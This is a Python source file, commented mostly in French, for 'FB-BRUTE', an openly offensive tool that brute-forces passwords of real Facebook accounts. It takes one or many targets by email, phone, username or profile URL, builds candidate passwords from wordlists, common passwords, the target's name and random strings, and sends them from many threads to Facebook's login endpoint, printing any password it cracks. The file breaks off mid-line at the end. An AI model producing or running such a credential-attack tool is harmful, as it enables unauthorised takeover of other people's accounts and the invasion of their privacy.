import time
import sys
import itertools
import string
import math
import random
import hashlib
import os
import glob
import threading
import concurrent.futures
from typing import Generator, List, Set
import requests

# ==================== AFFICHAGE FB-BRUTE STYLE ====================
class FB_BRUTE_Display:
    """Affichage style FB-BRUTE professionnel"""
    
    @staticmethod
    def print_banner():
        os.system('clear' if os.name == 'posix' else 'cls')
        print("""\033[92m
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║  ███████╗██████╗      ██████╗██████╗ ██╗   ██╗████████╗███████╗  ║
    ║  ██╔════╝██╔══██╗    ██╔════╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝  ║
    ║  █████╗  ██████╔╝    ██║     ██████╔╝██║   ██║   ██║   █████╗    ║
    ║  ██╔══╝  ██╔══██╗    ██║     ██╔══██╗██║   ██║   ██║   ██╔══╝    ║
    ║  ██║     ██║  ██║    ╚██████╗██║  ██║╚██████╔╝   ██║   ███████╗  ║
    ║  ╚═╝     ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝  ║
    ║                                                                  ║
    ║          🅕 🅐 🅒 🅔 🅑 🅞 🅞 🅚   🅑 🅡 🅤 🅣 🅔   🅕 🅞 🅡 🅒 🅔          ║
    ║                                                                  ║
    ║              [Version 4.0 - ULTIMATE AI POWER PRO]               ║
    ║              [Multi-Target + Email + Phone + Links]              ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    \033[0m""")

    @staticmethod
    def print_loading(text):
        print(f"\033[96m[→]\033[0m \033[97m{text}\033[0m", end='', flush=True)
    
    @staticmethod
    def print_success(text):
        print(f"\033[92m[✓]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_error(text):
        print(f"\033[91m[✗]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_warning(text):
        print(f"\033[93m[!]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_info(text):
        print(f"\033[94m[i]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_attack(text):
        print(f"\033[91m[⚡]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_target(text):
        print(f"\033[95m[🎯]\033[0m \033[97m{text}\033[0m")

    @staticmethod
    def animate_text(text, delay=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()

    @staticmethod
    def progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r\033[94m{prefix}\033[0m |\033[92m{bar}\033[0m| {percent}% \033[94m{suffix}\033[0m', end='\r')
        if iteration == total:
            print()

# ==================== CONFIGURATION ULTRA-RAPIDE ====================
class FB_BRUTE_Config:
    MAX_THREADS = 12  # Augmentation du parallélisme
    MAX_PASSWORD_LENGTH = 30
    MIN_PASSWORD_LENGTH = 1
    BATCH_SIZE = 1000
    REQUEST_DELAY = (0.03, 0.1)  # Délai ultra-réduit
    TIMEOUT = 8
    CHUNK_SIZE = 10000
    
    # Fichiers prioritaires
    PRIORITY_FILES = [
        'passwords.txt', 'rockyou.txt', 'common_passwords.txt',
        'wordlist.txt', 'top_passwords.txt', 'french_passwords.txt'
    ]
    
    # Types de cibles supportés
    TARGET_TYPES = ['email', 'phone', 'username', 'profile_url']

# ==================== GESTIONNAIRE MULTI-CIBLES ====================
class MultiTargetManager:
    """Gestion des multiples cibles Facebook"""
    
    @staticmethod
    def detect_target_type(target):
        """Détecte automatiquement le type de cible"""
        target = target.strip().lower()
        
        if '@' in target and '.' in target:
            return 'email'
        elif target.isdigit() and len(target) >= 9:
            return 'phone'
        elif 'facebook.com/' in target or 'fb.com/' in target:
            return 'profile_url'
        else:
            return 'username'

    @staticmethod
    def load_targets_from_file(filename):
        """Charge plusieurs cibles depuis un fichier"""
        targets = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    target = line.strip()
                    if target:
                        target_type = MultiTargetManager.detect_target_type(target)
                        targets.append({'value': target, 'type': target_type})
            return targets
        except FileNotFoundError:
            return []

# ==================== GÉNÉRATEUR DE MOTS DE PASSE ULTIME ====================
class FB_BRUTE_Generator:
    """Générateur ultime optimisé pour FB-BRUTE"""
    
    def __init__(self, file_passwords, target_info=None):
        self.file_passwords = file_passwords
        self.target_info = target_info or {}
        self.generated_count = 0
        self.current_phase = 0
        
        self.phases = [
            "📂 Fichiers de Mots de Passe",
            "⚡ Patterns Ultra-Rapides", 
            "🔧 Combinaisons Intelligentes",
            "🧮 Algorithmes Mathématiques",
            "💥 Brute Force Massif"
        ]

    def generate_all_passwords(self) -> Generator[str, None, None]:
        """Génération complète sans limites"""
        
        # Phase 1: Mots de passe des fichiers
        self.current_phase = 1
        FB_BRUTE_Display.print_attack(f"PHASE 1: {self.phases[0]}")
        
        for pwd in self.file_passwords:
            self.generated_count += 1
            yield pwd
        
        # Phase 2: Patterns ultra-rapides
        self.current_phase = 2
        FB_BRUTE_Display.print_attack(f"PHASE 2: {self.phases[1]}")
        
        priority_passwords = self.generate_priority_passwords()
        for pwd in priority_passwords:
            self.generated_count += 1
            yield pwd
        
        # Phase 3: Combinaisons intelligentes
        self.current_phase = 3
        FB_BRUTE_Display.print_attack(f"PHASE 3: {self.phases[2]}")
        
        smart_combos = self.generate_smart_combinations()
        for pwd in smart_combos:
            self.generated_count += 1
            yield pwd
        
        # Phase 4: Algorithmes mathématiques
        self.current_phase = 4
        FB_BRUTE_Display.print_attack(f"PHASE 4: {self.phases[3]}")
        
        math_patterns = self.generate_mathematical_patterns()
        for pwd in math_patterns:
            self.generated_count += 1
            yield pwd
        
        # Phase 5: Brute force massif
        self.current_phase = 5
        FB_BRUTE_Display.print_attack(f"PHASE 5: {self.phases[4]}")
        
        brute_force = self.generate_massive_bruteforce()
        for pwd in brute_force:
            self.generated_count += 1
            yield pwd

    def generate_priority_passwords(self):
        """Mots de passe prioritaires pour résultats rapides"""
        priority = [
            # Top 50 mondial
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', 'password1',
            '1234', 'admin', 'hello', 'welcome', 'monkey', 'dragon',
            'sunshine', 'password123', 'admin123', 'welcome123',
            
            # Spécifique Facebook
            'facebook', 'facebook123', 'fbpassword', 'fb123456',
            'facebookpassword', 'fbpass', 'facebookpass',
            
            # Avec la cible
            'storm', 'storm123', 'Storm123', 'STORM123', 'storm1234',
            'storm,1234', 'storm.1234', 'storm-1234'
        ]
        
        # Ajouter des infos ciblées
        if self.target_info.get('name'):
            name = self.target_info['name'].lower()
            priority.extend([
                name, name + '123', name + '1234', name.capitalize() + '123',
                name + '!', name + '@123'
            ])
        
        return priority

    def generate_smart_combinations(self):
        """Combinaisons intelligentes et ciblées"""
        base_words = ['storm', 'password', 'admin', 'facebook', 'user', 'login']
        
        if self.target_info.get('name'):
            base_words.append(self.target_info['name'].lower())
        
        for word in base_words:
            # Variations de base
            yield word
            yield word.upper()
            yield word.capitalize()
            
            # Leet speak basique
            leet_variations = [
                word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0'),
                word.replace('s', '5').replace('t', '7'),
                word.replace('a', '@').replace('s', '$')
            ]
            for leet in leet_variations:
                yield leet
            
            # Suffixes numériques massifs
            for i in range(100000):
                yield f"{word}{i}"
                if i < 10000:
                    yield f"{word}{i:04d}"
                if i < 1000:
                    yield f"{word}{i:03d}"
            
            # Avec séparateurs
            separators = ['', '.', ',', '-', '_', '!', '@', '#', '$', '%']
            for sep in separators:
                for i in range(1000):
                    yield f"{word}{sep}{i}"
                    yield f"{i}{sep}{word}"

    def generate_mathematical_patterns(self):
        """Patterns mathématiques avancés"""
        # Fibonacci
        fib = [1, 1]
        while len(str(fib[-1])) <= 10:
            fib.append(fib[-1] + fib[-2])
            yield str(fib[-1])
        
        # Nombres premiers
        primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]
        for prime in primes:
            yield str(prime)
        
        # Constantes
        constants = ['314159', '271828', '161803', '141421', '577215']
        for constant in constants:
            yield constant

    def generate_massive_bruteforce(self):
        """Brute force massif optimisé"""
        charset = string.ascii_lowercase + string.digits + '!@#$'
        
        # Court et moyen d'abord
        for length in range(4, 7):
            for _ in range(10000):  # 10k par longueur
                yield ''.join(random.choices(charset, k=length))
        
        # Plus long mais moins d'échantillons
        for length in range(7, 9):
            for _ in range(1000):
                yield ''.join(random.choices(charset, k=length))

# ==================== MOTEUR FB-BRUTE MULTI-THREAD ====================
class FB_BRUTE_Engine:
    """Moteur principal FB-BRUTE ultra-rapide"""
    
    def __init__(self):
        self.found = False
        self.found_password = None
        self.attempts = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        
        # Pool de sessions pour performance
        self.session_pool = [requests.Session() for _ in range(FB_BRUTE_Config.MAX_THREADS)]
        for session in self.session_pool:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            })

    def try_password_batch(self, target, password_batch, thread_id):
        """Tente un lot de mots de passe"""
        session = self.session_pool[thread_id % len(self.session_pool)]
        
        for password in password_batch:
            if self.found:
                return
                
            with self.lock:
                self.attempts += 1
            
            # Délai ultra-minimal
            time.sleep(random.uniform(*FB_BRUTE_Config.REQUEST_DELAY))
            
            try:
                response = session.post(
                    'https://www.facebook.com/login.php',
                    data={
                        'email': target['value'], 
                        'pass': password, 
                        'login': 'Log In'
                    },
                    allow_redirects=True,
                    timeout=FB_BRUTE_Config.TIMEOUT
                )
                
                # Détection robuste
                success_indicators = [
                    'Find Friends', 'Two-factor authentication', 'home_main',
                    'newsfeed', 'fbDTSG', 'userNav', 'bookmarks'
                ]
                
                if any(indicator in response.text for indicator in success_indicators):
                    with self.lock:
                        if not self.found:
                            self.found = True
                            self.found_password = password
                            self.found_target = target
                    return
                    
            except Exception:
                continue

    def attack_single_target(self, target, password_generator):
        """Attaque une cible unique"""
        print(f"\n\033[95m[🎯] Attacking: {target['value']} ({target['type']})\033[0m")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=FB_BRUTE_Config.MAX_THREADS) as executor:
            futures = []
            password_batch = []
            
            for password in password_generator:
                if self.found:
                    break
                    
                password_batch.append(password)
                
                if len(password_batch) >= FB_BRUTE_Config.BATCH_SIZE:
                    future = executor.submit(self.try_password_batch, target, password_batch.copy(), len(futures))
                    futures.append(future)
                    password_batch = []
            
            # Dernier lot
            if password_batch and not self.found:
                executor.submit(self.try_password_batch, target, password_batch, len(futures))
            
            concurrent.futures.wait(futures)
        
        return self.found_password

# ==================== PROGRAMME PRINCIPAL FB-BRUTE ====================
def main():
    FB_BRUTE_Display.print_banner()
    
    # Animation de démarrage
    FB_BRUTE_Display.animate_text("\033[91mInitializing FB-BRUTE Ultimate System...\033[0m")
    time.sleep(0.5)
    
    FB_BRUTE_Display.animate_text("\033[93mLoading AI-Powered Brute Force Engine...\033[0m")
    time.sleep(0.5)
    
    FB_BRUTE_Display.animate_text("\033[92mActivating Multi-Threading Attack Mode...\033[0m")
    time.sleep(0.5)
    
    print("\n" + "="*70)
    
    # Choix du mode d'attaque
    print("\033[96m[?] Select attack mode:\033[0m")
    print("  1. Single Target")
    print("  2. Multiple Targets from file")
    
    choice = input("\033[96m[?] Choice (1-2): \033[92m").strip()
    print("\033[0m", end="")
    
    targets = []
    
    if choice == "1":
        # Cible unique
        target_input = input("\033[96m[?] Enter target (email/phone/username/URL): \033[92m").strip()
        print("\033[0m", end="")
        
        target_type = MultiTargetManager.detect_target_type(target_input)
        targets.append({'value': target_input, 'type': target_type})
        
    elif choice == "2":
        # Fichier de cibles
        target_file = input("\033[96m[?] Enter targets file: \033[92m").strip()
        print("\033[0m", end="")
        
        targets = MultiTargetManager.load_targets_from_file(target_file)
        if not targets:
            FB_BRUTE_Display.print_error("No targets found in file!")
            return
        
        FB_BRUTE_Display.print_success(f"Loaded {len(targets)} targets")
    
    else:
        FB_BRUTE_Display.print_error("Invalid choice!")
        return
    
    # Chargement des mots de passe
    FB_BRUTE_Display.print_info("Loading password files...")
    
    password_files = []
    for file in FB_BRUTE_Config.PRIORITY_FILES:
        if os.path.exists(file):
            password_files.append(file)
    
    if not password_files:
        FB_BRUTE_Display.print_error("No password files found!")
        return
    
    all_passwords = set()
    for file in password_files:
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if FB_BRUTE_Config.MIN_PASSWORD_LENGTH <= len(pwd) <= FB_BRUTE_Config.MAX_PASSWORD_LENGTH:
                        all_passwords.add(pwd)
        except Exception as e:
            FB_BRUTE_Display.print_error(f"Error loading {file}: {e}")
    
    if not all_passwords:
        FB_BRUTE_Display.print_error("No passwords loaded!")
        return
    
    FB_BRUTE_Display.print_success(f"Loaded {len(all_passwords):,} passwords")
    
    # Informations cible optionnelles
    target_info = {}
    use_advanced = input("\033[96m[?] Use advanced targeting? (y/n): \033[92m").strip().lower()
    print("\033[0m", end="")
    
    if use_advanced == 'y':
        target_info['name'] = input("\033[96m[?] Target name: \033[92m").strip()
        target_info['birth_year'] = input("\033[96m[?] Birth year: \033[92m").strip()
        print("\033[0m", end="")
    
    # Lancement des attaques
    print("\n" + "="*70)
    FB_BRUTE_Display.print_attack("STARTING FB-BRUTE ULTIMATE ATTACK!")
    FB_BRUTE_Display.print_info(f"Threads: {FB_BRUTE_Config.MAX_THREADS} | Targets: {len(targets)}")
    print("="*70)
    
    overall_start = time.time()
    successful_cracks = 0
    
    for i, target in enumerate(targets, 1):
        if successful_cracks >= 1 and len(targets) > 1:  # Arrêter après premier succès en multi-target
            continue
            
        FB_BRUTE_Display.print_target(f"Target {i}/{len(targets)}: {target['value']}")
        
        # Réinitialiser le moteur pour chaque cible
        engine = FB_BRUTE_Engine()
        generator = FB_BRUTE_Generator(list(all_passwords), target_info)
        
        # Statistiques en temps réel
        def live_stats():
            while not engine.found and engine.attempts < 1000000:
                elapsed = time.time() - engine.start_time
                speed = engine.attempts / elapsed if elapsed > 0 else 0
                print(f"\r\033[94m[🚀] Phase: {generator.phases[generator.current_phase-1]} | "
                      f"Attempts: {engine.attempts:,} | "
                      f"Speed: {speed:.0f}/sec | "
                      f"Elapsed: {elapsed:.1f}s\033[0m", end='', flush=True)
                time.sleep(0.5)
        
        stats_thread = threading.Thread(target=live_stats, daemon=True)
        stats_thread.start()
        
        # Lancer l'attaque
        result = engine.attack_single_target(target, generator.generate_all_passwords())
        
        # Résultats
        print("\n" + "-"*50)
        if result:
            successful_cracks += 1
            FB_BRUTE_Display.animate_text("\033[92m[💥 CRACK SUCCESSFUL!]\033[0m")
            print(f"\033[92m[✓] Target: {target['value']}\033[0m")
            print(f"\033[92m[✓] Password: {result}\033[0m")
            print(f"\033[94m[i] Statistics:\033[0m")
            print(f"   • Attempts: {engine.attempts:,}")
            print(f"   • Time: {time.time() - engine.start_time:.2f}s")
            print(f"   • Speed: {engine.attempts/(time.time()-engine.start_time):.0f} pwd/sec")
        else:
            FB_BRUTE_Display.print_error(f"Password not found for {target['value']}")
            print(f"\033[93m[i] Attempted {engine.attempts:,} passwords\033[0m")
        
        print("-"*50)
    
    # Résumé final
    print("\n" + "="*70)
    total_time = time.time() - overall_start
    
    if successful_cracks > 0:
        FB_BRUTE_Display.animate_text(f"\033[92m[🎉 MIS